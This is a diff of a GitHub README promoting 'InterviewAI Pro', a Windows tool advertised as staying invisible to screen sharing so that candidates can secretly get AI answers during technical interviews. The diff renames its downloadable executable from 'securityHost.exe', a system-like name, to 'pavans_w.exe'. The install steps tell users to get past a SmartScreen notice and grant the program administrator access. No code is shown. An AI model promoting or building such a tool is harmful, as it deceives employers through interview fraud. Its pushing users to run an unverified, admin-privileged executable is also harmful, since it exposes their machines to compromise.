@@ -1,42 +1,17 @@
-<div align="center">
+# ⚡ InterviewAI Pro — Invisible AI Co-Pilot For Technical Interviews
 
-  <!-- Animated Typing Title Banner -->
-  <a href="https://github.com/ravanERROR/pavans_Ai">
-    <img src="https://readme-typing-svg.demolab.com?font=Outfit&weight=800&size=34&duration=2500&pause=800&color=00F5A0&center=true&vCenter=true&width=800&height=70&lines=⚡+InterviewAI+Pro+—+Invisible+AI+Co-Pilot;🛡️+100%25+Screen+Share+Immunity+on+Zoom+%26+Teams;🧠+Multi-Brain+AI+Engine+(Gemini%2C+NVIDIA%2C+Groq);📸+1-Click+Live+Screen+Snapshots+(Ctrl%2BH);🎧+Real-time+Voice+Question+Transcription" alt="InterviewAI Pro Animated Header" />
-  </a>
+> **100% Invisible to Screen Share, Zoom, Microsoft Teams & Remote Desktop Tools**  
+> *Real-time AI voice transcription, multi-provider engine backup, instant screen snapshots, and discreet controls for passing technical interviews with total confidence.*
 
-  <p align="center">
-    <b>The Ultimate Enterprise-Grade Invisible AI Co-Pilot For Technical & Coding Interviews</b>
-  </p>
+---
 
-  <!-- High Contrast Status Badges -->
-  <p align="center">
-    <a href="https://github.com/ravanERROR/pavans_Ai/releases"><img src="https://img.shields.io/badge/Release-Latest-00f2fe?style=for-the-badge&labelColor=0d1117&logo=github&logoColor=00f2fe" alt="Release"></a>
-    <a href="https://github.com/ravanERROR/pavans_Ai"><img src="https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011%20(x64)-7000ff?style=for-the-badge&labelColor=0d1117&logo=windows&logoColor=7000ff" alt="Platform"></a>
-    <a href="https://github.com/ravanERROR/pavans_Ai"><img src="https://img.shields.io/badge/Privacy-100%25%20Screen%20Share%20Invisible-00f5a0?style=for-the-badge&labelColor=0d1117&logo=shield&logoColor=00f5a0" alt="Privacy"></a>
-  </p>
+[![Release](https://img.shields.io/badge/Release-Latest-00f2fe?style=for-the-badge&logo=github)](https://github.com/ravanERROR/pavans_Ai/releases)
+[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011%20(64--bit)-7000ff?style=for-the-badge&logo=windows)](https://github.com/ravanERROR/pavans_Ai)
+[![Privacy Status](https://img.shields.io/badge/Privacy-100%25%20Screen%20Share%20Invisible-00f5a0?style=for-the-badge&logo=shield)](https://github.com/ravanERROR/pavans_Ai)
 
-  <br/>
+<br>
 
-  <!-- Animated Download Prompt -->
-  <a href="https://github.com/ravanERROR/pavans_Ai/releases/latest/download/securityHost.zip">
-    <img src="https://readme-typing-svg.demolab.com?font=Outfit&weight=800&size=20&duration=2000&pause=600&color=00F5A0&background=0D111700&center=true&vCenter=true&width=600&height=40&lines=🚀+CLICK+BELOW+TO+DOWNLOAD+LATEST+RELEASE;⚡+INSTANT+ZIP+PACKAGE+—+SECURITYHOST.ZIP;📦+STANDALONE+EXE+—+SECURITYHOST.EXE" alt="Animated Download CTA" />
-  </a>
-
-  <br/><br/>
-
-  <!-- High-Visibility Vibrant Download Buttons -->
-  <p align="center">
-    <a href="https://github.com/ravanERROR/pavans_Ai/releases/latest/download/securityHost.zip">
-      <img src="https://img.shields.io/badge/⚡_DIRECT_DOWNLOAD-securityHost.zip-00f5a0?style=for-the-badge&labelColor=0d1117&color=00f5a0&logo=windows&logoColor=00f5a0" height="52" alt="Download ZIP">
-    </a>
-    &nbsp;&nbsp;&nbsp;&nbsp;
-    <a href="https://github.com/ravanERROR/pavans_Ai/raw/main/securityHost.exe">
-      <img src="https://img.shields.io/badge/📦_DOWNLOAD_EXE-securityHost.exe-00f2fe?style=for-the-badge&labelColor=0d1117&color=00f2fe&logo=windows&logoColor=00f2fe" height="52" alt="Download EXE">
-    </a>
-  </p>
-
-</div>
+[<img src="https://img.shields.io/badge/⚡_DIRECT_DOWNLOAD-pavans__w.zip_(Latest_Release)-00f5a0?style=for-the-badge&logo=windows&logoColor=black" height="46">](https://github.com/ravanERROR/pavans_Ai/releases/latest/download/pavans_w.zip) &nbsp; [<img src="https://img.shields.io/badge/📦_DOWNLOAD_EXE-pavans__w.exe-00f2fe?style=for-the-badge&logo=windows&logoColor=black" height="46">](https://github.com/ravanERROR/pavans_Ai/raw/main/pavans_w.exe)
 
 ---
 
@@ -68,9 +43,9 @@ Control your AI assistant silently without taking your hands off the keyboard du
 | <kbd>Ctrl</kbd> + <kbd>R</kbd> | **Reset Interview Session** |
 | <kbd>Ctrl</kbd> + <kbd>X</kbd> | **Send Input** |
 | <kbd>Ctrl</kbd> + <kbd>O</kbd> | **Toggle Speech Target** |
-| <kbd>Ctrl</kbd> + <kbd>Alt</kbd> + <kbd>I</kbd> | **Global Launch Hotkey** |
-| <kbd>Ctrl</kbd> + <kbd>Alt</kbd> + <kbd>Q</kbd> | **Exit Application** |
+| <kbd>Shift</kbd> + <kbd>↑</kbd> <kbd>↓</kbd> <kbd>←</kbd> <kbd>→</kbd> | **Move / Reposition Window** |
 | <kbd>↑</kbd> <kbd>↓</kbd> <kbd>←</kbd> <kbd>→</kbd> | **Smooth Scroll Navigation** |
+| <kbd>Ctrl</kbd> + <kbd>Alt</kbd> + <kbd>Q</kbd> | **Exit Application** |
 
 ---
 
@@ -86,18 +61,10 @@ Control your AI assistant silently without taking your hands off the keyboard du
 
 Click a direct download button below to get the latest release:
 
-<p align="center">
-  <a href="https://github.com/ravanERROR/pavans_Ai/releases/latest/download/securityHost.zip">
-    <img src="https://img.shields.io/badge/⬇️_DIRECT_DOWNLOAD-securityHost.zip-00f5a0?style=for-the-badge&labelColor=0d1117&color=00f5a0&logo=windows&logoColor=00f5a0" height="46" alt="Download ZIP">
-  </a>
-  &nbsp;&nbsp;&nbsp;&nbsp;
-  <a href="https://github.com/ravanERROR/pavans_Ai/raw/main/securityHost.exe">
-    <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_EXE-securityHost.exe-00f2fe?style=for-the-badge&labelColor=0d1117&color=00f2fe&logo=windows&logoColor=00f2fe" height="46" alt="Download EXE">
-  </a>
-</p>
+[<img src="https://img.shields.io/badge/⬇️_DIRECT_DOWNLOAD-pavans__w.zip-00f5a0?style=for-the-badge&logo=windows&logoColor=black" height="42">](https://github.com/ravanERROR/pavans_Ai/releases/latest/download/pavans_w.zip) &nbsp; [<img src="https://img.shields.io/badge/⬇️_DOWNLOAD_EXE-pavans__w.exe-00f2fe?style=for-the-badge&logo=windows&logoColor=black" height="42">](https://github.com/ravanERROR/pavans_Ai/raw/main/pavans_w.exe)
 
-- **ZIP Archive (Recommended)**: Download [`securityHost.zip`](https://github.com/ravanERROR/pavans_Ai/releases/latest/download/securityHost.zip) and extract it to any folder.
-- **Standalone Executable**: Download [`securityHost.exe`](https://github.com/ravanERROR/pavans_Ai/raw/main/securityHost.exe).
+- **ZIP Archive (Recommended)**: Download [`pavans_w.zip`](https://github.com/ravanERROR/pavans_Ai/releases/latest/download/pavans_w.zip) and extract it to any folder.
+- **Standalone Executable**: Download [`pavans_w.exe`](https://github.com/ravanERROR/pavans_Ai/raw/main/pavans_w.exe).
 
 ---
 
@@ -114,8 +81,8 @@ If Windows SmartScreen displays a notice:
 ---
 
 ### 🎯 Step 4: Start Interview Assistant
-1. Run `securityHost.exe` to launch the application.
-2. Allow administrator access to the application.
+1. Run `pavans_w.exe` to launch the application.
+2. allow adminstrator access to the application.
 3. Join your interview call on Zoom or Teams.
 4. Use `Ctrl+H` for screen snapshots or let the speaker listener transcribe interviewer questions in real time!
 
